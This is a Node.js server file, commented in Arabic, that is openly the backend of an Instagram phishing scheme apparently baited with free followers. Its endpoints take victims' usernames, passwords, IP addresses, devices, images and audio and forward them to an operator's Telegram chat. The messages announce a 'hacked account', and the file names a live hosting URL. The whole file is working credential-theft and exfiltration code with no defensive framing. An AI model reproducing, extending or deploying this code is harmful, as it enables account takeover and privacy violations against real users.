require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// تكوين multer للتعامل مع رفع الملفات
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// الحصول على التوكن من متغير البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;

// التحقق من وجود التوكن
if (!BOT_TOKEN) {
  console.error('❌ Telegram Bot Token is not configured');
  console.warn('⚠️  سيتم تشغيل السيرفر ولكن إرسال الرسائل إلى Telegram لن يعمل');
}

// وظيفة لإرسال رسالة إلى Telegram
async function sendToTelegram(chatId, message, fileBuffer = null, filename = null) {
  try {
    // إذا لم يكن هناك توكن، نعود بنجاح وهمي للتجربة
    if (!BOT_TOKEN) {
      console.log(`📤 [محاكاة] إرسال إلى chatId ${chatId}: ${message}`);
      if (fileBuffer) {
        console.log(`📁 [محاكاة] مع ملف: ${filename}`);
      }
      return true;
    }

    if (fileBuffer && filename) {
      // إذا كان هناك ملف، أرسله مع الرسالة
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('caption', message);
      formData.append('document', fileBuffer, { filename: filename });
      
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, formData, {
        headers: formData.getHeaders()
      });
      
      return response.data.ok;
    } else {
      // إذا لم يكن هناك ملف، أرسل الرسالة فقط
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      });
      
      return response.data.ok;
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error.response?.data || error.message);
    return false;
  }
}

// نقطة النهاية لاستقبال بيانات التسجيل (المستخدمة في الموقع)
app.post('/sendToTelegram', async (req, res) => {
  try {
    const { playerId, password, amount, chatId, platform = "انستقرام", device, ip } = req.body;
    
    // التحقق من البيانات المطلوبة
    if (!playerId || !password || !amount || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة: يرجى التأكد من إرسال جميع البيانات المطلوبة'
      });
    }

    const userDevice = device || req.headers['user-agent'] || "غير معروف";
    const userIP = ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || "غير معروف";
    
    const message = `♦️ - تم تسجيل حساب جديد 

🔹 - اسم المستخدم: ${playerId}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount}
📱 - الجهاز: ${userDevice}
🌍 - IP: ${userIP}
🔄 - المنصة: ${platform}`;

    // إرسال الرسالة إلى Telegram
    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.json({
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح',
        orderId: `#${Math.floor(100000 + Math.random() * 900000)}`
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'فشل في إرسال الرسالة إلى Telegram'
      });
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء إرسال البيانات',
      error: error.message
    });
  }
});

// نقطة النهاية القديمة (للتوافق مع الإصدارات السابقة)
app.post('/send-to-telegram', async (req, res) => {
  try {
    const { playerId, password, amount, chatId, platform = "انستقرام", device } = req.body;
    
    // التحقق من البيانات المطلوبة
    if (!playerId || !password || !amount || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'بيانات ناقصة: يرجى التأكد من إرسال جميع البيانات المطلوبة'
      });
    }

    const userDevice = device || req.headers['user-agent'] || "غير معروف";
    
    // الحصول على عنوان IP المستخدم
    let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
    if (userIP === '::1') userIP = '127.0.0.1 (localhost)';
    
    const message = `♦️ - تم اختراق حساب جديد 

🔹 - اسم المستخدم: ${playerId}
🔑 - كلمة المرور: ${password}
💰 - المبلغ: ${amount}
📱 - الجهاز: ${userDevice}
🌍 - IP: ${userIP}
🔄 - المنصة: ${platform}`;

    // إرسال الرسالة إلى Telegram
    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.json({
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح',
        orderId: `#${Math.floor(100000 + Math.random() * 900000)}`
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'فشل في إرسال الرسالة إلى Telegram'
      });
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'حدث خطأ أثناء إرسال البيانات',
      error: error.message
    });
  }
});

// نقطة النهاية لاستقبال بيانات التسجيل العامة
app.post('/register', async (req, res) => {
  try {
    const { username, password, ip, chatId } = req.body;
    
    if (!username || !password || !ip || !chatId) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required fields: username, password, ip, and chatId are required' 
      });
    }

    const message = `📝 تسجيل حساب جديد\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🌐 عنوان IP: ${ip}`;
    
    const success = await sendToTelegram(chatId, message);
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال البيانات إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال البيانات إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing registration:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// نقطة النهاية لاستقبال الصور
app.post('/upload-image', upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'No image file provided' 
      });
    }

    const { username, imageType, chatId } = req.body;
    
    let message = `🖼️ تم اختراق صورة جديدة`;
    if (username) message += `\n👤 المستخدم: ${username}`;
    if (imageType) message += `\n📸 نوع الصورة: ${imageType}`;
    
    const success = await sendToTelegram(
      chatId, 
      message, 
      req.file.buffer, 
      `image-${Date.now()}${path.extname(req.file.originalname || '.jpg')}`
    );
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال الصورة إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال الصورة إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing image upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// نقطة النهاية لاستقبال ملفات الصوت
app.post('/upload-audio', upload.single('audio'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ 
        success: false,
        error: 'No audio file provided' 
      });
    }

    const { username, chatId } = req.body;
    
    let message = `🎵 تم تسجيل صوت جديد`;
    if (username) message += `\n👤 المستخدم: ${username}`;
    
    const success = await sendToTelegram(
      chatId, 
      message, 
      req.file.buffer, 
      `audio-${Date.now()}${path.extname(req.file.originalname || '.mp3')}`
    );
    
    if (success) {
      res.status(200).json({ 
        success: true,
        message: 'تم إرسال الصوت إلى Telegram بنجاح' 
      });
    } else {
      res.status(500).json({ 
        success: false,
        error: 'فشل في إرسال الصوت إلى Telegram' 
      });
    }
  } catch (error) {
    console.error('Error processing audio upload:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error' 
    });
  }
});

// نقطة النهاية لملف config.js
app.get('/config.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`
// Telegram Bot Server Configuration
var SERVER_URL = "https://botlkm.onrender.com";
var SITE_NAME = "instagram_followers";
var API_VERSION = "1.0";

console.log('✅ تم تحميل إعدادات السيرفر بنجاح');
console.log('🌐 السيرفر: ' + SERVER_URL);
  `);
});

// نقطة النهاية للتحقق من عمل السيرفر
app.get('/health', (req, res) => {
  res.status(200).json({ 
    success: true,
    status: 'Server is running',
    tokenConfigured: !!BOT_TOKEN,
    environment: process.env.NODE_ENV || 'development',
    timestamp: new Date().toISOString(),
    endpoints: {
      sendToTelegram: '/sendToTelegram (POST)',
      sendToTelegramOld: '/send-to-telegram (POST)',
      register: '/register (POST)',
      uploadImage: '/upload-image (POST)',
      uploadAudio: '/upload-audio (POST)',
      config: '/config.js (GET)',
      health: '/health (GET)'
    }
  });
});

// نقطة النهاية الرئيسية
app.get('/', (req, res) => {
  res.status(200).json({ 
    success: true,
    message: 'مرحباً بك في سيرفر Telegram Bot',
    version: '2.0',
    description: 'سيرفر متخصص في استقبال وإرسال بيانات حسابات انستقرام إلى Telegram',
    endpoints: {
      health: '/health',
      sendToTelegram: '/sendToTelegram (POST)',
      sendToTelegramOld: '/send-to-telegram (POST)',
      register: '/register (POST)',
      uploadImage: '/upload-image (POST)',
      uploadAudio: '/upload-audio (POST)',
      config: '/config.js'
    },
    usage: {
      example: `fetch(SERVER_URL + '/sendToTelegram', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    playerId: "username",
    password: "password",
    amount: "1000 متابع",
    chatId: "123456789",
    platform: "انستقرام"
  })
})`
    }
  });
});

// معالجة الأخطاء
app.use((error, req, res, next) => {
  console.error('Unhandled error:', error);
  res.status(500).json({
    success: false,
    message: 'Internal Server Error',
    error: process.env.NODE_ENV === 'production' ? 'Something went wrong' : error.message
  });
});

// معالجة المسارات غير الموجودة
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    message: 'Endpoint not found',
    requestedUrl: req.originalUrl,
    availableEndpoints: [
      'GET /',
      'GET /health',
      'GET /config.js',
      'POST /sendToTelegram',
      'POST /send-to-telegram',
      'POST /register',
      'POST /upload-image',
      'POST /upload-audio'
    ]
  });
});

// بدء السيرفر
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
  console.log(`🌐 Base URL: https://botlkm.onrender.com`);
  console.log(`🔧 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🤖 Bot Token Configured: ${!!BOT_TOKEN}`);
  
  if (!BOT_TOKEN) {
    console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
  } else {
    console.log('✅ BOT_TOKEN مضبوط وجاهز للإرسال');
  }
  
  console.log('\n📋 Available Endpoints:');
  console.log('   GET  /health          - فحص حالة السيرفر');
  console.log('   GET  /config.js       - ملف الإعدادات');
  console.log('   POST /sendToTelegram  - إرسال بيانات الحساب (الجديد)');
  console.log('   POST /send-to-telegram - إرسال بيانات الحساب (القديم)');
  console.log('   POST /register        - تسجيل عام');
  console.log('   POST /upload-image    - رفع صورة');
  console.log('   POST /upload-audio    - رفع صوت');
});
